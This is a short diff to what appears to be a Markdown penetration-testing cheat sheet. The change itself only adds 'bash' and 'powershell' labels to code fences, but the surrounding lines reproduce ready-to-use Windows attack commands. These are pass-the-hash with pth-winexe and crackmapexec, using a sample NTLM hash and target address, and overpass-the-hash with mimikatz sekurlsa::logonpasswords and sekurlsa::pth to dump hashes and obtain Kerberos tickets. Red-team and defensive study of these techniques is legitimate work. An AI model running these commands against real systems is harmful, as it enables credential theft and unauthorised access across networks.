@@ -236,7 +236,7 @@ Pass-the-Hash
 * Requires pw-hash user to have local admin rights on target, as connection is made using the `Admin$` share.
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
-```
+```bash
 # Method 1
 $ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
 $ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
@@ -261,7 +261,7 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami"
 Overpass-the-Hash
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
 * Requires pw-hash user to have local admin rights on target to run `psexec.exe`.
-```
+```powershell
 mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
 mimikatz > sekurlsa::pth               # turn hash into Kerberos ticket
         /user:[user_name] 
